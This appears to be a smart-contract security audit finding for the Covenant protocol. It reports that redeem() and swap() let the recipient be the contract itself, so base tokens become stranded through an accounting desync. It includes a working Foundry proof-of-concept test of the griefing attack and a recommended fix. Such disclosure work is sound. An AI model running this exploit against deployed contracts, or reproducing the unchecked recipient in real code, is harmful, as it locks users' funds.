  "body": "## Summary\n\nThe Covenant contract allows users to set the recipient address to the contract itself (`address(this)`) when redeeming tokens or swapping to base assets. This creates a vulnerability where ERC20 transfers become no-ops while internal accounting (`baseSupply`) is still decremented, permanently locking base tokens in the contract and reducing effective liquidity for all users.\n\n## Description\n\nIn the `redeem()` and `swap()` functions, when base tokens are being paid out, the contract transfers tokens to a user-specified recipient address without validating that the recipient is not the contract itself. When a user sets the recipient to `address(this)`, the ERC20 transfer becomes a self-transfer that most standard ERC20 implementations treat as a no-op - the token balance remains unchanged. However, the contract still decrements `marketState.baseSupply` by the payout amount and any protocol fees, creating a persistent divergence between the contract's actual token balance and its internal accounting.\n\nThe vulnerability occurs in two specific code paths. In `redeem()`, the function updates `ms.baseSupply = localBaseSupply - amountOut - protocolFees` and then executes `IERC20(mp.baseToken).safeTransfer(redeemParams.to, amountOut)`. Similarly, in `swap()` when `assetOut == BASE`, the function updates `ms.baseSupply = localBaseSupply - amount - protocolFees` and executes `IERC20(mp.baseToken).safeTransfer(swapParams.to, amount)`. In both cases, if the recipient is `address(this)`, the accounting update occurs but no tokens actually leave the contract.\n\nThis behavior is inconsistent with the `collectProtocolFee()` function, which explicitly prevents self-transfers by checking `if (recipient == address(this)) revert Errors.E_Unauthorized()`. The absence of this same validation in the payout paths creates an unintended griefing vector.\n\n## Affected Code\n\n[src/Covenant.sol:327-333](https://github.com/code-423n4/2025-10-covenant/blob/main/src/Covenant.sol#L327-L333)\n\n\n```solidity\n// Update market state (storage)\nms.baseSupply = localBaseSupply - amountOut - protocolFees;\nif (protocolFees > 0) ms.protocolFeeGrowth += protocolFees;\n\n// Transfer base asset out\nIERC20(mp.baseToken).safeTransfer(redeemParams.to, amountOut);\n```\n\n[src/Covenant.sol:376-392](https://github.com/code-423n4/2025-10-covenant/blob/main/src/Covenant.sol#L376-L392)\n\n\n```solidity\n// Update market state (storage) and transfer if swap involves base tokens\nif (protocolFees > 0) ms.protocolFeeGrowth += protocolFees;\nif (swapParams.assetIn == AssetType.BASE) {\n    uint256 amount = swapParams.isExactIn ? swapParams.amountSpecified : amountCalculated;\n    // update state\n    ms.baseSupply = localBaseSupply + amount - protocolFees;\n    // transfer\n    IERC20(mp.baseToken).safeTransferFrom(_msgSender(), address(this), amount);\n} else if (swapParams.assetOut == AssetType.BASE) {\n    uint256 amount = swapParams.isExactIn ? amountCalculated : swapParams.amountSpecified;\n    // update state\n    ms.baseSupply = localBaseSupply - amount - protocolFees;\n    // transfer\n    IERC20(mp.baseToken).safeTransfer(swapParams.to, amount);\n} else if (protocolFees > 0) {\n    ms.baseSupply = localBaseSupply - protocolFees;\n}\n```\n\n\n## Impact Explanation\n\nThe vulnerability enables permanent locking of base tokens within the contract. Each time a self-transfer occurs, the difference between the contract's actual ERC20 balance and the tracked `baseSupply` increases by the payout amount plus any protocol fees. These excess tokens become permanently stranded since they are not reflected in the internal accounting and cannot be withdrawn through normal user flows or protocol fee collection mechanisms. The locked funds reduce the effective liquidity available to all users, as liquidity calculations rely on `baseSupply` rather than the actual token balance, potentially impairing future redemptions and degrading overall market functionality.\n\n## Likelihood Explanation\n\nThe vulnerability can be triggered by any user simply by setting the recipient parameter to the Covenant contract address during redemption or base-out swaps. Most standard ERC20 tokens allow self-transfers without reverting, making the condition broadly applicable across different base tokens. However, materializing significant impact requires attackers to sacrifice their own redemption proceeds, as they must lock their own tokens to harm the system. While the exploit mechanism is straightforward to execute, causing substantial damage would require repeated execution with considerable capital investment.\n\n## Recommendation\n\nConsider adding recipient validation to prevent self-transfers in base token payout paths. The same validation logic already implemented in `collectProtocolFee()` could be applied to the `redeem()` and `swap()` functions. One approach would be to add a check similar to the existing one:\n\n```diff\n  // In redeem() function, before the transfer\n+ if (redeemParams.to == address(this)) revert Errors.E_Unauthorized();\n  IERC20(mp.baseToken).safeTransfer(redeemParams.to, amountOut);\n\n  // In swap() function, before the transfer when assetOut == BASE\n+ if (swapParams.to == address(this)) revert Errors.E_Unauthorized();\n  IERC20(mp.baseToken).safeTransfer(swapParams.to, amount);\n```\n\nThis validation would maintain consistency with the existing protocol fee collection logic and prevent the accounting desynchronization that enables fund locking. The change would be minimal and align with the apparent design intent demonstrated by the existing safeguard in fee collection.",
  "proof_of_concept": "## Proof of Concept\n\nCreate a new file `test/poc/C4PoC_AccountingDesync.t.sol` with the following content:\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity ^0.8.30;\n\nimport \"forge-std/Test.sol\";\n\nimport {Covenant, MarketId, MarketParams} from \"src/Covenant.sol\";\nimport {ICovenant, IERC20, AssetType, MintParams, RedeemParams} from \"src/interfaces/ICovenant.sol\";\nimport {ILiquidExchangeModel} from \"src/interfaces/ILiquidExchangeModel.sol\";\nimport {ILatentSwapLEX} from \"src/lex/latentswap/interfaces/ILatentSwapLEX.sol\";\nimport {LatentSwapLEX} from \"src/lex/latentswap/LatentSwapLEX.sol\";\nimport {FixedPoint} from \"src/lex/latentswap/libraries/FixedPoint.sol\";\nimport {LatentSwapLib} from \"src/periphery/libraries/LatentSwapLib.sol\";\nimport {MockERC20} from \"test/mocks/MockERC20.sol\";\nimport {MockOracle} from \"test/mocks/MockOracle.sol\";\n\ncontract C4PoC_AccountingDesync is Test {\n    // LatentSwapLEX init pricing constants (reuse from project tests)\n    uint160 internal constant P_MAX = uint160((1095445 * FixedPoint.Q96) / 1000000);\n    uint160 internal constant P_MIN = uint160(FixedPoint.Q192 / P_MAX);\n    uint32 internal constant DURATION = 30 days;\n    uint8 internal constant SWAP_FEE = 0; // simplify\n    int64 internal constant LN_RATE_BIAS = 5012540000000000; // WAD\n    uint160 internal P_LIM_H = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9500);\n    uint160 internal P_LIM_MAX = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9999);\n\n    // Actors and contracts\n    Covenant internal covenant;\n    LatentSwapLEX internal lex;\n    MockOracle internal oracle;\n    MockERC20 internal base;\n    MockERC20 internal quote;\n\n    // Helper to get current ERC20 balance held by Covenant for a market's base token\n    function _balanceOfCovenant(MarketId marketId) internal view returns (uint256) {\n        address baseToken = covenant.getIdToMarketParams(marketId).baseToken;\n        return IERC20(baseToken).balanceOf(address(covenant));\n    }\n\n    function test_submissionValidity() public {\n        // 1) Deploy tokens and oracle\n        oracle = new MockOracle(address(this));\n        base = new MockERC20(address(this), \"MockBase\", \"MBA\", 18);\n        quote = new MockERC20(address(this), \"MockQuote\", \"MQA\", 18);\n\n        // fund attacker/user\n        base.mint(address(this), 1_000e18);\n\n        // 2) Deploy Covenant and LEX, enable components\n        covenant = new Covenant(address(this));\n        lex = new LatentSwapLEX(\n            address(this),\n            address(covenant),\n            P_MAX,\n            P_MIN,\n            P_LIM_H,\n            P_LIM_MAX,\n            LN_RATE_BIAS,\n            DURATION,\n            SWAP_FEE\n        );\n        covenant.setEnabledLEX(address(lex), true);\n        covenant.setEnabledCurator(address(oracle), true);\n\n        // 3) Create market\n        MarketParams memory mp = MarketParams({\n            baseToken: address(base),\n            quoteToken: address(quote),\n            curator: address(oracle),\n            lex: address(lex)\n        });\n        MarketId marketId = covenant.createMarket(mp, hex\"\");\n\n        // 4) Mint base into the market to obtain aToken and zToken\n        uint256 deposit = 100e18;\n        IERC20(address(base)).approve(address(covenant), deposit);\n\n        (uint256 aOut, uint256 zOut) = covenant.mint(\n            MintParams({\n                marketId: marketId,\n                marketParams: mp,\n                baseAmountIn: deposit,\n                to: address(this),\n                minATokenAmountOut: 0,\n                minZTokenAmountOut: 0,\n                data: hex\"\",\n                msgValue: 0\n            })\n        );\n\n        // Sanity: baseSupply equals ERC20 balance held by Covenant\n        uint256 baseSupplyBefore = covenant.getMarketState(marketId).baseSupply;\n        uint256 erc20Before = _balanceOfCovenant(marketId);\n        assertEq(baseSupplyBefore, erc20Before, \"pre: baseSupply != ERC20 balance\");\n\n        // 5) Attacker redeems full synth supply but sets recipient to Covenant itself\n        // This triggers a self-transfer: Covenant transfers base to itself (no-op),\n        // yet still decrements internal baseSupply.\n        uint256 amountOut = covenant.redeem(\n            RedeemParams({\n                marketId: marketId,\n                marketParams: mp,\n                aTokenAmountIn: aOut,\n                zTokenAmountIn: zOut,\n                to: address(covenant), // exploit: self-transfer\n                minAmountOut: 0,\n                data: hex\"\",\n                msgValue: 0\n            })\n        );\n\n        // 6) Post-conditions: ERC20 balance unchanged, but baseSupply decreased\n        uint256 baseSupplyAfter = covenant.getMarketState(marketId).baseSupply; // expected 0 in full-redeem path\n        uint256 erc20After = _balanceOfCovenant(marketId);\n\n        // ERC20 balance did not decrease (self-transfer was a no-op)\n        assertEq(erc20After, erc20Before, \"post: ERC20 balance should be unchanged due to self-transfer\");\n\n        // Internal accounting decreased by the redeemed amount\n        // For full-redeem fast path, amountOut == baseSupplyBefore and baseSupplyAfter == 0\n        assertEq(baseSupplyBefore - baseSupplyAfter, amountOut, \"post: baseSupply should drop by redeemed amount\");\n\n        // Concrete impact: Internal accounting is now desynced from actual ERC20 holdings.\n        // The difference represents permanently locked funds.\n        uint256 stranded = erc20After - baseSupplyAfter;\n        assertEq(stranded, amountOut, \"post: stranded tokens should equal redeemed amountOut\");\n\n        // 7) Demonstrate stranded funds cannot be withdrawn via protocol fee collection\n        // No protocol fees accrued; attempting to collect won't move the stranded funds.\n        // Collect to an arbitrary recipient and assert Covenant's ERC20 balance remains unchanged.\n        address recipient = address(0xBEEF);\n        uint256 covBalPreCollect = IERC20(address(base)).balanceOf(address(covenant));\n        covenant.collectProtocolFee(marketId, recipient, uint128(stranded)); // caps to accrued fees (zero)\n        uint256 covBalPostCollect = IERC20(address(base)).balanceOf(address(covenant));\n        assertEq(covBalPostCollect, covBalPreCollect, \"collectProtocolFee should not withdraw stranded funds\");\n\n        // 8) Additionally, attempting any base-out operation is bounded by baseSupply (now 0),\n        // so no user can extract the stranded balance via normal flows.\n        // The PoC concludes with a verifiable accounting mismatch proving locked funds.\n    }\n}\n```\n\nRun it with the following command:\n\n```\nforge test --match-test submissionValidity -vvv\n```\n\n\nThe proof of concept demonstrates that setting the base payout recipient to Covenant itself (`address(this)`) in `redeem()` causes a self-transfer no-op while Covenant still decrements `marketState.baseSupply`. This creates a persistent accounting mismatch between the actual ERC20 balance held and the internal `baseSupply`. As shown, after redeeming with `to = address(covenant)`, ERC20 balance remains unchanged while `baseSupply` drops to zero, stranding the redeemed amount as permanently locked funds inside the contract. Subsequent `collectProtocolFee` calls cannot recover these stranded tokens because no protocol fees were accrued, and future base-out operations are constrained by `baseSupply`, making the mismatch a durable lock of funds and degrading market solvency and liquidity for users.",
